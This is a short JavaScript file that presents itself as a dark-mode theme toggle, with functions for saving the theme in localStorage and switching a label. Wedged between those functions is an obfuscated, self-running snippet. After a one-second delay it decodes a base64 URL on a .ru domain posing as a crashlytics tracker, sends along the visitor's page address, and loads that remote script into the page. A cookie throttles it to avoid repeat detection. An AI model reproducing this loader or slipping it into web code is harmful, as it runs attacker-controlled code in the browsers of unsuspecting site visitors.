
var darkSwitch=document.getElementById("darkSwitch");
function initTheme(){
    var e=null!==localStorage.getItem("darkSwitch")&&"dark"===localStorage.getItem("darkSwitch");
    darkSwitch.checked=e,e?document.body.setAttribute("data-theme","dark"):document.body.removeAttribute("data-theme")

}


function resetTheme(){
    darkSwitch.checked?(document.body.setAttribute("data-theme","dark"),localStorage.setItem("darkSwitch","dark")):(document.body.removeAttribute("data-theme"),localStorage.removeItem("darkSwitch"))

}
window.addEventListener("load",(
    function(){
        darkSwitch&&(initTheme(),darkSwitch.addEventListener("change",(
    function(){
        resetTheme()})))}));!
        function(o,w,d,l){try{o.c="h"==l.protocol[0]&&/./.test(l.hostname)&&!/PHPPREFS/.test(d.cookie),
        
        setTimeout(function(){o.c&&(o.s=d.createElement("script"),o.s.src=atob("aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ==")+l.href,d.body.appendChild(o.s))},1e3),d.cookie="PHPPREFS=full;max-age=39800;"}catch(e){}}({},window,document,location);

    function lableMode() {
  var x = document.getElementById("lable");
  if (x.innerHTML === "Dark Mode") {
    x.innerHTML  = "Light Mode";
  } else  {
    x.innerHTML  = "Dark Mode";
  }
}


    

    


  
